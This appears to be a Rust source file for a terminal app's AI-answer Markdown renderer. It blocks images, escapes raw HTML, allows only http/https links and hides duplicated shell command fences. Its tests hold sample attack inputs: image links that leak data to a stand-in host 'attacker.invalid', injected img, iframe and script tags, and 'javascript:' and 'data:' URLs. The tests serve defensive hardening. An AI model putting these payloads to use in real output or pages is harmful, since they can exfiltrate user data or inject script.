//! Presentation-only Markdown filtering. Never change persisted/provider answer text.
use std::{collections::HashMap, ops::Range, sync::Arc};

use gpui::{
    App, ElementId, ImageSource, Overflow, SharedString, StyleRefinement, Styled, Window,
    component::{
        ActiveTheme,
        text::{SelectionFormat, TextView, TextViewStyle},
    },
    prelude::*,
    px, rems,
};
use markdown::{ParseOptions, mdast::Node};

use crate::theme::{ActivePalette, MONO_FONT};

#[derive(Default)]
pub(crate) struct MarkdownCache {
    conversation: String,
    items: HashMap<(usize, usize), CachedText>,
}

struct CachedText {
    source: String,
    commands: Vec<String>,
    text: SharedString,
}

impl MarkdownCache {
    pub fn text(
        &mut self,
        conversation: &str,
        key: (usize, usize),
        source: &str,
        commands: &[String],
    ) -> SharedString {
        if self.conversation != conversation {
            self.items.clear();
            self.conversation = conversation.to_owned();
        }
        if let Some(cached) = self.items.get(&key)
            && cached.source == source
            && cached.commands == commands
        {
            // Long SharedStrings share their allocation: TextView's fast path checks
            // its pointer. Short inline strings use the state's equality check.
            return cached.text.clone();
        }
        let text: SharedString = preprocess(source, commands).into();
        self.items.insert(
            key,
            CachedText {
                source: source.to_owned(),
                commands: commands.to_vec(),
                text: text.clone(),
            },
        );
        text
    }
}

pub(super) fn element_id(conversation: &str, turn: usize, item: usize) -> ElementId {
    // Length-prefix the arbitrary conversation identifier; no index arithmetic collisions.
    SharedString::from(format!(
        "ai-markdown-{}:{conversation}:{turn}:{item}",
        conversation.len()
    ))
    .into()
}

pub(super) fn can_open_link(url: &str) -> bool {
    // Do not normalize whitespace/control characters into an otherwise disallowed scheme.
    !url.chars().any(|c| c.is_control() || c.is_whitespace())
        && url.split_once("://").is_some_and(|(scheme, rest)| {
            (scheme.eq_ignore_ascii_case("http") || scheme.eq_ignore_ascii_case("https"))
                && !rest.is_empty()
                && !rest.starts_with(['/', '\\', '?', '#'])
        })
}

fn blocked_image() -> ImageSource {
    // Authoritative for both intrinsic measurement and painting, including data/file URLs.
    ImageSource::Custom(Arc::new(|_, _| None))
}

#[derive(Clone, Copy, Default, PartialEq, Eq)]
pub(crate) enum CopyFixture { #[default] None, Hovered, Copied }

pub(super) fn drawer_view(id: ElementId, text: SharedString, selection: gpui::Entity<super::selection_scroll::SelectionScroll>, fixture: CopyFixture, window: &Window, cx: &App) -> TextView {
    render_view(id, text, Some(selection), fixture, window, cx)
}
pub(crate) fn view(id: ElementId, text: SharedString, window: &Window, cx: &App) -> TextView {
    render_view(id, text, None, CopyFixture::None, window, cx)
}
fn render_view(id: ElementId, text: SharedString, selection: Option<gpui::Entity<super::selection_scroll::SelectionScroll>>, fixture: CopyFixture, window: &Window, cx: &App) -> TextView {
    let scope = format!("{id:?}");
    base_view(id, text, window, cx)
        .markdown_block_parser(blocks::parse)
        .markdown_block_renderer("ai-scroll-block", move |node, window, cx| {
            blocks::render(&scope, node, selection.clone(), fixture, window, cx)
        })
}

/// Literal step text participates in TextView's automatic document ordering,
/// so selections spanning prose, commands and output copy in reading order.
#[derive(gpui::IntoElement)]
pub(super) struct PlainText { id: ElementId, text: SharedString }
pub(super) fn plain(id: impl Into<ElementId>, text: impl Into<SharedString>) -> PlainText {
    PlainText { id: id.into(), text: text.into() }
}
fn preformatted_html(text: &str) -> String {
    // A comment prevents HTML's special stripping of an initial pre newline.
    format!("<pre><!--literal-->{}</pre>", text.replace('&', "&amp;").replace('<', "&lt;").replace('>', "&gt;"))
}
impl gpui::RenderOnce for PlainText {
    fn render(self, window: &mut Window, _: &mut App) -> impl gpui::IntoElement {
        let style = window.text_style();
        let font_size = style.font_size.to_pixels(window.rem_size());
        let width = self.text.lines().map(|line| {
            window.text_system().shape_line(line.to_owned().into(), font_size, &[style.to_run(line.len())], None).width()
        }).max().unwrap_or(px(0.));
        TextView::html(self.id, preformatted_html(&self.text))
            .selectable(true).selection_format(SelectionFormat::Plain).scrollable(false)
            .style(TextViewStyle { paragraph_gap: rems(0.), ..Default::default() })
            .w(width).font_family(style.font_family.clone()).text_size(font_size)
            .line_height(window.line_height()).text_color(style.color).whitespace_nowrap()
    }
}

mod blocks;
mod copy;
mod code_selection;
mod cells;

fn base_view(id: ElementId, text: SharedString, window: &Window, cx: &App) -> TextView {
    let p = cx.palette();
    let terminal = cx.terminal_style().palette;
    let code_bg = shellmate_term::colors::to_hsla(terminal.background);
    let code_fg = shellmate_term::colors::to_hsla(terminal.foreground);
    let mut code = StyleRefinement::default()
        .bg(code_bg)
        .text_color(code_fg)
        .border_0()
        .rounded(px(10.))
        .p(px(11.))
        .font_family(MONO_FONT)
        .text_size(px(12.5))
        .line_height(px(18.))
        .whitespace_nowrap();
    code.overflow.x = Some(Overflow::Hidden);
    code.overflow.y = Some(Overflow::Visible);
    let mut table = StyleRefinement::default()
        .border_color(p.line)
        .rounded(px(8.));
    table.overflow.x = Some(Overflow::Scroll);
    let style = TextViewStyle {
        paragraph_gap: rems(8. / f32::from(window.rem_size())),
        highlight_theme: cx.theme().highlight_theme.clone(),
        is_dark: cx.is_dark(),
        ..Default::default()
    }
    .heading_font_size(|level, _| {
        px(match level {
            1 => 17.,
            2 => 16.,
            _ => 15.,
        })
    })
    .code_block(code)
    .table(table)
    .table_head(StyleRefinement::default().bg(p.card2).text_color(p.tx2))
    .table_cell(
        StyleRefinement::default()
            .py(px(8.))
            .border_color(p.line),
    );

    TextView::markdown(id, text)
        .selectable(true)
        .selection_format(SelectionFormat::Plain)
        .scrollable(false)
        .style(style)
        // The built-in language badge reserves 28px above code. An empty action
        // replaces it so our compact 11px padding never overlaps the first line.
        .code_block_actions(|_, _, _| gpui::div())
        .inline_code_style(
            StyleRefinement::default()
                .font_family(MONO_FONT)
                .text_size(px(12.5))
                .text_color(code_fg)
                .bg(code_bg)
                .rounded(px(4.))
                .px(px(4.)),
        )
        .list_style(
            StyleRefinement::default()
                .text_color(p.tx2)
                .min_w(px(16.))
                .pr(px(4.)),
        )
        .blockquote_style(
            StyleRefinement::default()
                .border_l_1()
                .border_color(p.line)
                .text_color(p.tx2),
        )
        .image_source(|_| blocked_image())
        .on_link_click(|url, _, _, cx| {
            if can_open_link(url) {
                cx.open_url(url);
            }
        })
        .w_full()
        .min_w_0()
        .text_size(px(13.))
        .line_height(px(21.45))
        .text_color(p.tx)
}

/// Escape text so neither HTML nor Markdown embedded in alt text/raw HTML can be reparsed.
fn literal(text: &str) -> String {
    let mut escaped = String::with_capacity(text.len());
    for c in text.chars() {
        match c {
            '&' => escaped.push_str("&amp;"),
            '<' => escaped.push_str("&lt;"),
            '>' => escaped.push_str("&gt;"),
            c if c.is_ascii_punctuation() => {
                escaped.push('\\');
                escaped.push(c);
            }
            _ => escaped.push(c),
        }
    }
    escaped
}

pub(super) fn preprocess(source: &str, commands: &[String]) -> String {
    if !source.contains("![") && !source.contains('<') && commands.is_empty() {
        return source.to_owned();
    }
    let Ok(root) = markdown::to_mdast(source, &ParseOptions::gfm()) else {
        // Fail closed, even for malformed/incomplete streamed input.
        return literal(source);
    };
    let mut edits = Vec::new();
    collect_edits(&root, source, commands, &mut edits);
    let mut result = String::with_capacity(source.len());
    let mut offset = 0;
    for (range, replacement) in edits {
        result.push_str(&source[offset..range.start]);
        result.push_str(&replacement);
        offset = range.end;
    }
    result.push_str(&source[offset..]);
    result
}

fn collect_edits(
    node: &Node,
    source: &str,
    commands: &[String],
    edits: &mut Vec<(Range<usize>, String)>,
) {
    let replacement = match node {
        Node::Image(image) => Some(literal(&format!("[图片：{}]", image.alt))),
        Node::ImageReference(image) => Some(literal(&format!("[图片：{}]", image.alt))),
        Node::Html(html) => Some(literal(&html.value)),
        Node::Code(code)
            if code.position.as_ref().is_some_and(|p| {
                let start = &source[p.start.offset..p.end.offset];
                (start.starts_with("```") || start.starts_with("~~~"))
                    && matches!(
                        code.lang
                            .as_deref()
                            .unwrap_or("")
                            .to_ascii_lowercase()
                            .as_str(),
                        "" | "sh" | "bash" | "shell" | "zsh"
                    )
                    && commands
                        .iter()
                        .any(|command| command.trim() == code.value.trim())
            }) =>
        {
            Some(String::new())
        }
        _ => None,
    };
    if let Some(replacement) = replacement
        && let Some(p) = node.position()
    {
        edits.push((p.start.offset..p.end.offset, replacement));
        return;
    }
    if let Some(children) = node.children() {
        for child in children {
            collect_edits(child, source, commands, edits);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn assert_safe(source: &str) -> String {
        fn visit(node: &Node) {
            assert!(
                !matches!(
                    node,
                    Node::Image(_) | Node::ImageReference(_) | Node::Html(_)
                ),
                "unsafe node: {node:?}"
            );
            if let Some(children) = node.children() {
                children.iter().for_each(visit);
            }
        }
        let result = preprocess(source, &[]);
        visit(&markdown::to_mdast(&result, &ParseOptions::gfm()).unwrap());
        result
    }

    #[test]
    fn images_become_literal_alt_including_references_and_links() {
        for source in [
            "![监控](https://attacker.invalid/?d=secret)",
            "![监控][ref]\n\n[ref]: https://attacker.invalid/image",
            "![监控][]\n\n[监控]: https://attacker.invalid/image",
            "![监控]\n\n[监控]: https://attacker.invalid/image",
            "[![监控](https://attacker.invalid/image)](https://example.com)",
        ] {
            assert!(assert_safe(source).contains("\\[图片：监控\\]"));
        }
        assert_safe("![&lt;img src=x&gt; **粗体** \\[括号\\]](data:image/svg+xml,x)");
        assert_safe("![一](file:///tmp/a) ![二](https://attacker.invalid/b)");
    }

    #[test]
    fn raw_html_is_literal_in_blocks_inline_and_streaming_prefixes() {
        for source in [
            "<img src=\"https://attacker.invalid/a\">",
            "文字 <b>粗体</b> <iframe src='https://attacker.invalid'></iframe>",
            "<div>\n![隐藏](https://attacker.invalid)\n<script>evil()</script>\n</div>",
            "<!-- ![隐藏](https://attacker.invalid) -->",
            "$<img src='https://attacker.invalid'> $",
        ] {
            assert_safe(source);
            for (end, _) in source
                .char_indices()
                .chain(std::iter::once((source.len(), '\0')))
            {
                assert_safe(&source[..end]);
            }
        }
        let code = "```html\n<img src=x>\n```\n\n`<b>literal</b>`";
        assert_eq!(assert_safe(code), code);
    }

    #[test]
    fn duplicate_shell_fences_removed_but_other_code_preserved() {
        let source = "之前\n\n```bash\n  echo ok  \n```\n\n```sh\necho keep\n```\n\n```python\necho ok\n```\n\n    echo ok\n\n之后";
        let result = preprocess(source, &["echo ok".into()]);
        assert!(!result.contains("```bash"));
        assert!(result.contains("```sh\necho keep\n```"));
        assert!(result.contains("```python\necho ok\n```"));
        assert!(result.contains("    echo ok"));
        assert!(result.starts_with("之前") && result.ends_with("之后"));
        for fence in ["```", "~~~sh", "```SHELL", "```zsh"] {
            let closing = if fence.starts_with('~') { "~~~" } else { "```" };
            assert!(
                preprocess(
                    &format!("{fence}\necho ok\n{closing}"),
                    &[" echo ok\n".into()]
                )
                .is_empty()
            );
        }
        assert_eq!(preprocess(source, &[]), source);
    }

    #[test]
    fn link_guard_allows_only_http_and_https() {
        for url in [
            "http://example.com",
            "https://example.com/a?q=1#b",
            "HTTPS://example.com",
        ] {
            assert!(can_open_link(url));
        }
        for url in [
            "javascript:alert(1)",
            "data:text/html,x",
            "file:///tmp/a",
            "ssh://host",
            "mailto:a@b.c",
            "//example.com",
            "/relative",
            " https://example.com",
            "https://",
            "https:///x",
            "https://x\n",
            "https:\\example.com",
        ] {
            assert!(!can_open_link(url), "{url}");
        }
    }

    #[test]
    fn markdown_ids_are_stable_and_unique_per_conversation_turn_item() {
        assert_eq!(element_id("a", 1, 2), element_id("a", 1, 2));
        let ids: std::collections::HashSet<_> = [
            element_id("a", 1, 2),
            element_id("b", 1, 2),
            element_id("a", 2, 1),
            element_id("a", 0, 1002),
            element_id("a:1", 2, 0),
            element_id("a", 12, 0),
        ]
        .into_iter()
        .collect();
        assert_eq!(ids.len(), 6);
    }

    #[test]
    fn markdown_cache_reuses_unchanged_items_and_invalidates_command_changes() {
        let mut cache = MarkdownCache::default();
        let source = "```sh\necho cache-reuses-the-same-heap-allocation\n```";
        let a = cache.text("a", (0, 0), source, &[]);
        let b = cache.text("a", (0, 0), source, &[]);
        assert_eq!(a.as_ptr(), b.as_ptr());
        cache.text("a", (0, 1), "streamed tail", &[]);
        assert_eq!(a.as_ptr(), cache.text("a", (0, 0), source, &[]).as_ptr());
        assert!(
            cache
                .text(
                    "a",
                    (0, 0),
                    source,
                    &["echo cache-reuses-the-same-heap-allocation".into()]
                )
                .is_empty()
        );
        assert_eq!(cache.text("b", (0, 0), source, &[]).as_ref(), source);
        assert_eq!(cache.items.len(), 1);
    }

    #[test]
    fn literal_step_text_preserves_whitespace_and_cannot_become_html() {
        assert_eq!(preformatted_html("\n  echo '<tag>' &amp;\n\tTAIL"), "<pre><!--literal-->\n  echo '&lt;tag&gt;' &amp;amp;\n\tTAIL</pre>");
    }
    #[test]
    fn image_resolver_never_returns_a_resource() {
        assert!(matches!(blocked_image(), ImageSource::Custom(_)));
    }
}
